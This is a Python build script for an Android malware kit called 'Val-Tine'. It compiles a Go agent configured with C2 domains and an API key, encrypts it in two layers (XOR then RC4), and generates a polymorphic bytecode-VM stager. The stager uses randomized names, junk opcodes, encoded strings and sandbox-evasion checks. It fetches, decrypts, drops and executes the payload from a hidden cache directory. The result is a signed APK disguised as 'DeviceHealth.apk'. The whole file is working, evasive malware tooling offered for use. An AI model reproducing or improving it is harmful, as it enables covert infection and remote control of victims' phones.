#!/usr/bin/env python3
"""
build_android.py — Android APK builder with polymorphic VM stager (like obfus.py)

Builds encrypted Android payload (stage 1), generates polymorphic bytecode VM
stager (stage 3-4 from obfus.py adapted for Android), packages into APK, signs it.

Usage:
  python3 build_android.py
  python3 build_android.py --domain abc.supabase.co --apikey eyJ...
"""

import argparse, os, random, re, shutil, subprocess, sys, tempfile, string
import json, time
from pathlib import Path

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ANDROID_DIR = os.path.join(SCRIPT_DIR, "android")
AGENT_DIR = os.path.join(ANDROID_DIR, "agent")
AGENT_SRC = os.path.join(AGENT_DIR, "main.go")
APP_DIR = os.path.join(ANDROID_DIR, "app")

def log(msg, tag="INFO"):
    colors = {"OK": "\033[92m", "ERR": "\033[91m", "WARN": "\033[93m", "INFO": "\033[94m"}
    reset = "\033[0m"
    c = colors.get(tag, "")
    print(f"  {c}[{tag}]{reset} {msg}")

def run(cmd, cwd=None, env=None, check=True):
    """Run shell command."""
    merged_env = os.environ.copy()
    if env:
        merged_env.update(env)
    result = subprocess.run(cmd, shell=True, cwd=cwd, env=merged_env, capture_output=True, text=True)
    if check and result.returncode != 0:
        log(f"Command failed: {cmd}", "ERR")
        if result.stderr:
            log(result.stderr.strip(), "ERR")
        sys.exit(1)
    return result

# ============================================================
# CRYPTO
# ============================================================

def xor_bytes(data, key):
    if isinstance(key, str):
        key = key.encode("utf-8")
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def rc4_crypt(data, key):
    if isinstance(key, str):
        key = key.encode("utf-8")
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    result = bytearray(len(data))
    i = j = 0
    for idx, b in enumerate(data):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        result[idx] = b ^ S[(S[i] + S[j]) & 0xFF]
    return bytes(result)

def generate_key(length=32):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def go_bytes(data):
    return ", ".join(f"0x{b:02x}" for b in data)

def xor_str(s, key_byte):
    return bytes(b ^ key_byte for b in s.encode("utf-8"))

# ============================================================
# IDENTIFIERS
# ============================================================

_GO_KEYWORDS = frozenset({
    "break", "case", "chan", "const", "continue", "default", "defer",
    "else", "fallthrough", "for", "func", "go", "goto", "if", "import",
    "interface", "map", "package", "range", "return", "select", "struct",
    "switch", "type", "var",
})
_RESERVED_PATTERNS = re.compile(r"^[VN]\d$")

def rand_id(min_len=5, max_len=10):
    while True:
        length = random.randint(min_len, max_len)
        first = random.choice(string.ascii_letters)
        rest = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
        ident = first + rest
        if ident not in _GO_KEYWORDS and not _RESERVED_PATTERNS.match(ident):
            return ident

def unique_ids(count, min_len=5, max_len=10):
    ids = set()
    while len(ids) < count:
        ids.add(rand_id(min_len, max_len))
    return list(ids)

# ============================================================
# VM ASSEMBLER
# ============================================================

class VMAssembler:
    def __init__(self):
        vals = random.sample(range(1, 256), 12)
        self.OP_NOP, self.OP_PUSH, self.OP_DEOBF = vals[0], vals[1], vals[2]
        self.OP_FETCH, self.OP_XDEC, self.OP_RDEC = vals[3], vals[4], vals[5]
        self.OP_WFILE, self.OP_EXEC, self.OP_SLEEP = vals[6], vals[7], vals[8]
        self.OP_ENVCK, self.OP_HALT, self.OP_JUNK = vals[9], vals[10], vals[11]
        self.obf_key = os.urandom(16)
        self.program = bytearray()

    def used_opcodes(self):
        return {self.OP_NOP, self.OP_PUSH, self.OP_DEOBF, self.OP_FETCH,
                self.OP_XDEC, self.OP_RDEC, self.OP_WFILE, self.OP_EXEC,
                self.OP_SLEEP, self.OP_ENVCK, self.OP_HALT, self.OP_JUNK}

    def _emit(self, opcode):
        self.program.append(opcode)

    def _emit_u16(self, opcode, value):
        self.program.append(opcode)
        self.program.append((value >> 8) & 0xFF)
        self.program.append(value & 0xFF)

    def _emit_data(self, opcode, data):
        self.program.append(opcode)
        length = len(data)
        self.program.append((length >> 8) & 0xFF)
        self.program.append(length & 0xFF)
        self.program.extend(data)

    def _emit_junk(self):
        self._emit_data(self.OP_JUNK, os.urandom(random.randint(4, 48)))

    def _obfuscate(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        return xor_bytes(data, self.obf_key)

    def assemble(self, url, xor_key, rc4_key, drop_path, sleep_ms):
        self.program = bytearray()
        for _ in range(random.randint(2, 6)):
            if random.random() > 0.4:
                self._emit_junk()
            else:
                self._emit(self.OP_NOP)
        self._emit(self.OP_ENVCK)
        self._emit_junk()
        self._emit_u16(self.OP_SLEEP, sleep_ms)
        self._emit(self.OP_NOP)
        self._emit_junk()
        self._emit_data(self.OP_PUSH, self._obfuscate(url))
        self._emit(self.OP_DEOBF)
        self._emit_junk()
        self._emit(self.OP_FETCH)
        for _ in range(random.randint(1, 3)):
            self._emit_junk()
        self._emit_data(self.OP_PUSH, self._obfuscate(rc4_key))
        self._emit(self.OP_DEOBF)
        self._emit(self.OP_NOP)
        self._emit(self.OP_RDEC)
        self._emit_junk()
        self._emit_data(self.OP_PUSH, self._obfuscate(xor_key))
        self._emit(self.OP_DEOBF)
        self._emit_junk()
        self._emit(self.OP_XDEC)
        self._emit(self.OP_NOP)
        self._emit_data(self.OP_PUSH, self._obfuscate(drop_path))
        self._emit(self.OP_DEOBF)
        self._emit(self.OP_WFILE)
        self._emit_junk()
        self._emit_u16(self.OP_SLEEP, random.randint(8000, 20000))
        self._emit_junk()
        self._emit(self.OP_EXEC)
        self._emit(self.OP_HALT)
        for _ in range(random.randint(3, 10)):
            self._emit_junk()
        return bytes(self.program)

# ============================================================
# STAGE 1 — Compile & Encrypt Payload
# ============================================================

def stage_compile_payload(raw_payload, xor_key, rc4_key):
    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = os.path.join(tmpdir, "main.go")
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(raw_payload)

        log("Initializing Go module...")
        run("go mod init agent", cwd=tmpdir)

        out_path = os.path.join(tmpdir, "agent")
        env = {
            "GOOS": "android",
            "GOARCH": "arm64",
            "CGO_ENABLED": "0",
        }

        log("Compiling for android/arm64...")
        run(f'go build -trimpath -ldflags="-s -w" -o "{out_path}" "main.go"', cwd=tmpdir, env=env)

        with open(out_path, "rb") as f:
            bin_data = f.read()
        log(f"Compiled: {len(bin_data)} bytes", "OK")

        # Dual encryption
        bin_data = xor_bytes(bin_data, xor_key)
        log("Layer 1: XOR encrypted", "OK")
        bin_data = rc4_crypt(bin_data, rc4_key)
        log("Layer 2: RC4 encrypted", "OK")

        return bin_data

# ============================================================
# STAGE 3 — Generate Polymorphic Stager (embedded in APK)
# ============================================================

def stage_generate_stager_source(asm, bytecode):
    """Generate polymorphic Go stager for Android."""
    B, E = "{", "}"
    str_key = random.randint(1, 255)

    def enc_str(s):
        return go_bytes(xor_str(s, str_key))

    # Random function names
    fn_dec = rand_id(6, 10)
    fn_rc4 = rand_id(6, 10)
    fn_fetch = rand_id(6, 10)
    fn_check = rand_id(6, 10)
    fn_vm = rand_id(6, 10)

    # Random variable names
    dec_d, dec_k, dec_r, dec_i, dec_b = unique_ids(5, 4, 6)
    rc4_data, rc4_key, rc4_s, rc4_j, rc4_i = unique_ids(5, 4, 6)
    rc4_ii, rc4_jj, rc4_res, rc4_idx, rc4_bv = unique_ids(5, 4, 6)
    ft_url, ft_cl, ft_req, ft_err, ft_resp, ft_body = unique_ids(6, 4, 6)
    ck_t = rand_id(4, 6)
    vm_prog, vm_key, vm_stk, vm_sp, vm_pc, vm_op = unique_ids(6, 4, 6)
    vm_sz, vm_d, vm_url2, vm_body2, vm_err2 = unique_ids(5, 4, 6)
    vm_k2, vm_data2, vm_res2, vm_rp, vm_fp = unique_ids(5, 4, 6)
    vm_ms = rand_id(4, 6)
    deobf_i, deobf_t = rand_id(4, 6), rand_id(4, 6)

    ua = "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36"
    rt_key = os.urandom(random.randint(16, 32))
    enc_bytecode = xor_bytes(bytecode, rt_key)

    available = [x for x in range(1, 256) if x not in asm.used_opcodes()]
    num_fake = random.randint(4, 6)
    fake_ops = random.sample(available, num_fake)

    src = []
    def add(line=""):
        src.append(line)

    add("package main")
    add("")
    add("import (")
    add('\t"io"')
    add('\t"net/http"')
    add('\t"os"')
    add('\t"path/filepath"')
    add('\t"runtime"')
    add('\t"syscall"')
    add('\t"time"')
    add('\t"unsafe"')
    add(")")
    add("")

    # Decoder
    add(f"func {fn_dec}({dec_d} []byte, {dec_k} byte) string {B}")
    add(f"\t{dec_r} := make([]byte, len({dec_d}))")
    add(f"\tfor {dec_i}, {dec_b} := range {dec_d} {B}")
    add(f"\t\t{dec_r}[{dec_i}] = {dec_b} ^ {dec_k}")
    add(f"\t{E}")
    add(f"\treturn string({dec_r})")
    add(E)
    add("")

    # RC4
    add(f"func {fn_rc4}({rc4_data} []byte, {rc4_key} []byte) []byte {B}")
    add(f"\tvar {rc4_s} [256]byte")
    add(f"\tfor {rc4_i} := range {rc4_s} {B} {rc4_s}[{rc4_i}] = byte({rc4_i}) {E}")
    add(f"\t{rc4_j} := 0")
    add(f"\tfor {rc4_i} := 0; {rc4_i} < 256; {rc4_i}++ {B}")
    add(f"\t\t{rc4_j} = ({rc4_j} + int({rc4_s}[{rc4_i}]) + int({rc4_key}[{rc4_i} % len({rc4_key})])) & 0xFF")
    add(f"\t\t{rc4_s}[{rc4_i}], {rc4_s}[{rc4_j}] = {rc4_s}[{rc4_j}], {rc4_s}[{rc4_i}]")
    add(f"\t{E}")
    add(f"\t{rc4_res} := make([]byte, len({rc4_data}))")
    add(f"\t{rc4_ii}, {rc4_jj} := 0, 0")
    add(f"\tfor {rc4_idx}, {rc4_bv} := range {rc4_data} {B}")
    add(f"\t\t{rc4_ii} = ({rc4_ii} + 1) & 0xFF")
    add(f"\t\t{rc4_jj} = ({rc4_jj} + int({rc4_s}[{rc4_ii}])) & 0xFF")
    add(f"\t\t{rc4_s}[{rc4_ii}], {rc4_s}[{rc4_jj}] = {rc4_s}[{rc4_jj}], {rc4_s}[{rc4_ii}]")
    add(f"\t\t{rc4_res}[{rc4_idx}] = {rc4_bv} ^ {rc4_s}[(int({rc4_s}[{rc4_ii}])+int({rc4_s}[{rc4_jj}])) & 0xFF]")
    add(f"\t{E}")
    add(f"\treturn {rc4_res}")
    add(E)
    add("")

    # Fetch
    add(f"func {fn_fetch}({ft_url} string) ([]byte, error) {B}")
    add(f"\t{ft_cl} := &http.Client{B}Timeout: 30 * time.Second{E}")
    add(f"\t{ft_req}, {ft_err} := http.NewRequest({fn_dec}([]byte{B}{enc_str('GET')}{E}, 0x{str_key:02x}), {ft_url}, nil)")
    add(f"\tif {ft_err} != nil {B} return nil, {ft_err} {E}")
    add(f"\t{ft_req}.Header.Set({fn_dec}([]byte{B}{enc_str('User-Agent')}{E}, 0x{str_key:02x}), {fn_dec}([]byte{B}{enc_str(ua)}{E}, 0x{str_key:02x}))")
    add(f"\t{ft_resp}, {ft_err} := {ft_cl}.Do({ft_req})")
    add(f"\tif {ft_err} != nil {B} return nil, {ft_err} {E}")
    add(f"\tdefer {ft_resp}.Body.Close()")
    add(f"\treturn io.ReadAll({ft_resp}.Body)")
    add(E)
    add("")

    # Check
    add(f"func {fn_check}() bool {B}")
    add(f"\tif runtime.NumCPU() < 2 {B} return false {E}")
    add(f"\t{ck_t} := time.Now()")
    add(f"\ttime.Sleep(150 * time.Millisecond)")
    add(f"\tif time.Since({ck_t}) < 100*time.Millisecond {B} return false {E}")
    add(f"\treturn true")
    add(E)
    add("")

    # VM
    add(f"func {fn_vm}({vm_prog} []byte, {vm_key} []byte) {B}")
    add(f"\tvar {vm_stk} [16][]byte")
    add(f"\t{vm_sp} := 0")
    add(f"\t{vm_pc} := 0")
    add(f"\tfor {vm_pc} < len({vm_prog}) {B}")
    add(f"\t\t{vm_op} := {vm_prog}[{vm_pc}]")
    add(f"\t\t{vm_pc}++")
    add(f"\t\tswitch {vm_op} {B}")

    # Real ops
    cases = []
    cases.append((asm.OP_NOP, [f"\t\t\t_ = len({vm_prog})"]))
    cases.append((asm.OP_PUSH, [
        f"\t\t\t{vm_sz} := int({vm_prog}[{vm_pc}])<<8 | int({vm_prog}[{vm_pc}+1])",
        f"\t\t\t{vm_pc} += 2",
        f"\t\t\t{vm_d} := make([]byte, {vm_sz})",
        f"\t\t\tcopy({vm_d}, {vm_prog}[{vm_pc}:{vm_pc}+{vm_sz}])",
        f"\t\t\t{vm_stk}[{vm_sp}] = {vm_d}",
        f"\t\t\t{vm_sp}++",
        f"\t\t\t{vm_pc} += {vm_sz}",
    ]))
    cases.append((asm.OP_DEOBF, [
        f"\t\t\t{deobf_t} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\tfor {deobf_i} := range {deobf_t} {B}",
        f"\t\t\t\t{deobf_t}[{deobf_i}] ^= {vm_key}[{deobf_i} % len({vm_key})]",
        f"\t\t\t{E}",
    ]))
    cases.append((asm.OP_FETCH, [
        f"\t\t\t{vm_url2} := string({vm_stk}[{vm_sp}-1])",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_body2}, {vm_err2} := {fn_fetch}({vm_url2})",
        f"\t\t\tif {vm_err2} != nil {B} return {E}",
        f"\t\t\t{vm_stk}[{vm_sp}] = {vm_body2}",
        f"\t\t\t{vm_sp}++",
    ]))
    cases.append((asm.OP_XDEC, [
        f"\t\t\t{vm_k2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_data2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_res2} := make([]byte, len({vm_data2}))",
        f"\t\t\tfor {deobf_i} := range {vm_data2} {B}",
        f"\t\t\t\t{vm_res2}[{deobf_i}] = {vm_data2}[{deobf_i}] ^ {vm_k2}[{deobf_i} % len({vm_k2})]",
        f"\t\t\t{E}",
        f"\t\t\t{vm_stk}[{vm_sp}-1] = {vm_res2}",
    ]))
    cases.append((asm.OP_RDEC, [
        f"\t\t\t{vm_k2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_stk}[{vm_sp}-1] = {fn_rc4}({vm_stk}[{vm_sp}-1], {vm_k2})",
    ]))
    cases.append((asm.OP_WFILE, [
        f"\t\t\t{vm_rp} := string({vm_stk}[{vm_sp}-1])",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_data2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_fp} := filepath.Join({fn_dec}([]byte{B}{enc_str('/data/local/tmp/.cache')}{E}, 0x{str_key:02x}), {vm_rp})",
        f"\t\t\tos.MkdirAll(filepath.Dir({vm_fp}), 0755)",
        f"\t\t\tif os.WriteFile({vm_fp}, {vm_data2}, 0755) != nil {B} return {E}",
        f"\t\t\t{vm_stk}[{vm_sp}] = []byte({vm_fp})",
        f"\t\t\t{vm_sp}++",
    ]))
    cases.append((asm.OP_EXEC, [
        f"\t\t\t{vm_rp} := string({vm_stk}[{vm_sp}-1])",
        f"\t\t\t{vm_sp}--",
        f"\t\t\tos.Chmod({vm_rp}, 0755)",
        f"\t\t\t_ = syscall.Exec({vm_rp}, []string{B}{E}, nil)",
    ]))
    cases.append((asm.OP_SLEEP, [
        f"\t\t\t{vm_ms} := int({vm_prog}[{vm_pc}])<<8 | int({vm_prog}[{vm_pc}+1])",
        f"\t\t\t{vm_pc} += 2",
        f"\t\t\ttime.Sleep(time.Duration({vm_ms}) * time.Millisecond)",
    ]))
    cases.append((asm.OP_ENVCK, [
        f"\t\t\tif !{fn_check}() {B} return {E}",
    ]))
    cases.append((asm.OP_HALT, [f"\t\t\treturn"]))
    cases.append((asm.OP_JUNK, [
        f"\t\t\t{vm_sz} := int({vm_prog}[{vm_pc}])<<8 | int({vm_prog}[{vm_pc}+1])",
        f"\t\t\t{vm_pc} += 2 + {vm_sz}",
    ]))

    # Fake ops
    for fop in fake_ops:
        cases.append((fop, [f"\t\t\t_ = {vm_pc}"]))

    random.shuffle(cases)
    for opval, body_lines in cases:
        add(f"\t\tcase 0x{opval:02x}:")
        for line in body_lines:
            add(line)
        add("")

    add(f"\t\t{E}")
    add(f"\t{E}")
    add(E)
    add("")

    # Main
    main_ep, main_rk, main_p = rand_id(4, 6), rand_id(4, 6), rand_id(4, 6)
    main_i, main_b = rand_id(3, 5), rand_id(3, 5)

    add(f"func main() {B}")
    add(f"\t{main_ep} := []byte{B}{go_bytes(enc_bytecode)}{E}")
    add(f"\t{main_rk} := []byte{B}{go_bytes(rt_key)}{E}")
    add(f"\t{main_p} := make([]byte, len({main_ep}))")
    add(f"\tfor {main_i}, {main_b} := range {main_ep} {B}")
    add(f"\t\t{main_p}[{main_i}] = {main_b} ^ {main_rk}[{main_i} % len({main_rk})]")
    add(f"\t{E}")
    add(f"\t{fn_vm}({main_p}, []byte{B}{go_bytes(asm.obf_key)}{E})")
    add(E)

    return "\n".join(src)

# ============================================================
# BUILD APK
# ============================================================

def build_apk(android_dir):
    wrapper_path = os.path.join(android_dir, "gradlew")
    if not os.path.exists(wrapper_path):
        log("Generating Gradle wrapper...", "WARN")
        run("gradle wrapper", cwd=android_dir)

    log("Building APK...")
    run("./gradlew assembleRelease --no-daemon -q", cwd=android_dir)

    apk_path = os.path.join(android_dir, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk")
    if not os.path.exists(apk_path):
        log("Release APK not found, trying debug...", "WARN")
        run("./gradlew assembleDebug --no-daemon -q", cwd=android_dir)
        apk_path = os.path.join(android_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk")

    if not os.path.exists(apk_path):
        log("APK build failed", "ERR")
        sys.exit(1)

    log(f"APK built: {apk_path}", "OK")
    return apk_path

def sign_apk(apk_path, output_path, android_home):
    bt_dir = os.path.join(android_home, "build-tools")
    if not os.path.isdir(bt_dir):
        log("Android build-tools not found", "ERR")
        sys.exit(1)

    versions = sorted(os.listdir(bt_dir), reverse=True)
    if not versions:
        log("No build-tools versions found", "ERR")
        sys.exit(1)

    bt = os.path.join(bt_dir, versions[0])
    zipalign = os.path.join(bt, "zipalign")

    keystore = os.path.join(SCRIPT_DIR, "android-debug.keystore")
    if not os.path.exists(keystore):
        log("Generating debug keystore...")
        run(f'keytool -genkeypair -v -keystore "{keystore}" -keyalg RSA -keysize 2048 -validity 10000 -alias androiddebugkey -storepass android -keypass android -dname "CN=Debug,OU=Dev,O=Dev,L=US,S=US,C=US"')

    aligned = output_path + ".aligned"
    if os.path.exists(zipalign):
        log("Zipaligning...")
        run(f'"{zipalign}" -f 4 "{apk_path}" "{aligned}"')
    else:
        shutil.copy2(apk_path, aligned)

    log("Signing APK...")
    run(f'jarsigner -keystore "{keystore}" -storepass android -keypass android -digestalg SHA-256 -sigalg SHA256withRSA -signedjar "{output_path}" "{aligned}" androiddebugkey')

    os.remove(aligned)
    size = os.path.getsize(output_path)
    log(f"Signed: {output_path} ({size // 1024} KB)", "OK")

def main():
    parser = argparse.ArgumentParser(description="Build Android APK with polymorphic stager")
    parser.add_argument("--domain", help="Primary Supabase domain")
    parser.add_argument("--domain2", help="Secondary Supabase domain")
    parser.add_argument("--apikey", help="Supabase API key")
    parser.add_argument("--output", default="DeviceHealth.apk", help="Output APK filename")
    args = parser.parse_args()

    print()
    print("  ╔══════════════════════════════════════╗")
    print("  ║   Val-Tine Android Builder           ║")
    print("  ║   (Polymorphic VM Stager)            ║")
    print("  ╚══════════════════════════════════════╝")
    print()

    # Read config
    env_file = os.path.join(SCRIPT_DIR, ".env")
    config = {}
    if os.path.exists(env_file):
        with open(env_file) as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    key, val = line.split("=", 1)
                    config[key.strip()] = val.strip().strip('"').strip("'")

    domain1 = args.domain or config.get("VITE_SUPABASE_URL", "").replace("https://", "")
    domain2 = args.domain2 or config.get("VITE_SUPABASE_URL_2", "").replace("https://", "")
    apikey = args.apikey or config.get("VITE_SUPABASE_ANON_KEY", "")

    if not domain1 or not apikey:
        log("C2 config required. Use .env or --domain/--apikey flags.", "ERR")
        sys.exit(1)

    log(f"C2 Domain: {domain1}")
    if domain2:
        log(f"C2 Domain 2: {domain2}")

    if not shutil.which("go"):
        log("Go compiler not found", "ERR")
        sys.exit(1)

    # Read agent
    with open(AGENT_SRC, "r") as f:
        agent_src = f.read()

    # Inject config
    agent_src = agent_src.replace("PLACEHOLDER_C2_DOMAIN_1", domain1)
    agent_src = agent_src.replace("PLACEHOLDER_C2_DOMAIN_2", domain2 or "")
    agent_src = agent_src.replace("PLACEHOLDER_C2_APIKEY", apikey)

    # Write to temp
    tmpdir = tempfile.mkdtemp(prefix="valtine_android_")
    patched_src = os.path.join(tmpdir, "main.go")
    with open(patched_src, "w") as f:
        f.write(agent_src)
    shutil.copy2(os.path.join(AGENT_DIR, "go.mod"), os.path.join(tmpdir, "go.mod"))

    # Stage 1: Compile & encrypt
    print()
    log("--- Stage 1: Compile & Encrypt Payload ---")
    xor_key = generate_key(32)
    rc4_key = generate_key(32)
    payload_data = stage_compile_payload(agent_src, xor_key, rc4_key)
    log(f"Encrypted payload: {len(payload_data)} bytes", "OK")

    # Stage 3: Generate stager (will be embedded in APK as Go source, then compiled)
    print()
    log("--- Stage 3: Generate VM Stager ---")

    # For Android, the stager needs to extract and run the payload
    # We'll embed the payload in the stager Go source
    asm = VMAssembler()
    # Bytecode will download from a staged URL; for Android APK, we embed it
    drop_path = "/data/local/tmp/.cache/agent"
    bytecode = asm.assemble(
        url="file:///data/local/tmp/.cache/payload.bin",  # Embedded or pre-placed
        xor_key=xor_key,
        rc4_key=rc4_key,
        drop_path=drop_path,
        sleep_ms=random.randint(2000, 5000),
    )
    log(f"Bytecode: {len(bytecode)} bytes, opcodes randomized", "OK")

    stager_src = stage_generate_stager_source(asm, bytecode)
    log(f"Stager source: {len(stager_src)} chars (polymorphic)", "OK")

    # Write stager to Android agent main.go for rebuilding
    # Actually, we need to REPLACE the agent's main.go with the stager
    # But that's problematic for normal APK packaging.
    # Instead: embed payload binary in APK assets, update agent to use it

    # For simplicity: keep agent as-is, write stager to separate module
    stager_dir = os.path.join(ANDROID_DIR, "stager")
    os.makedirs(stager_dir, exist_ok=True)
    with open(os.path.join(stager_dir, "main.go"), "w") as f:
        f.write(stager_src)
    with open(os.path.join(stager_dir, "go.mod"), "w") as f:
        f.write("module stager\n\ngo 1.21\n")

    # Stage 4: Compile stager for Android & package into APK
    print()
    log("--- Stage 4: Compile Android APK ---")

    # Compile stager for Android arm64 as native lib
    stager_out = os.path.join(ANDROID_DIR, "app", "src", "main", "jniLibs", "arm64-v8a", "libagent.so")
    os.makedirs(os.path.dirname(stager_out), exist_ok=True)

    env = {
        "GOOS": "android",
        "GOARCH": "arm64",
        "CGO_ENABLED": "0",
    }
    log("Compiling stager as libagent.so...")
    run(f'go build -trimpath -ldflags="-s -w" -o "{stager_out}" stager/main.go',
        cwd=ANDROID_DIR, env=env)

    # Also embed the encrypted payload in assets for the stager to use
    assets_dir = os.path.join(ANDROID_DIR, "app", "src", "main", "assets")
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, "payload.bin"), "wb") as f:
        f.write(payload_data)

    log("Payload embedded in assets", "OK")

    # Build APK
    apk_path = build_apk(ANDROID_DIR)

    # Sign
    android_home = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
    if not android_home:
        candidates = [
            os.path.expanduser("~/Android/Sdk"),
            os.path.expanduser("~/Library/Android/sdk"),
        ]
        for c in candidates:
            if os.path.isdir(c):
                android_home = c
                break

    if not android_home:
        log("Android SDK not found. Set ANDROID_HOME.", "ERR")
        sys.exit(1)

    output_path = os.path.join(SCRIPT_DIR, args.output)
    sign_apk(apk_path, output_path, android_home)

    # Cleanup
    jniLibs_root = os.path.join(ANDROID_DIR, "app", "src", "main", "jniLibs")
    if os.path.isdir(jniLibs_root):
        shutil.rmtree(jniLibs_root)

    print()
    log("Build complete!", "OK")
    log(f"Output: {output_path}", "OK")
    print()
    print("  Install via: adb install " + args.output)
    print()

if __name__ == "__main__":
    main()
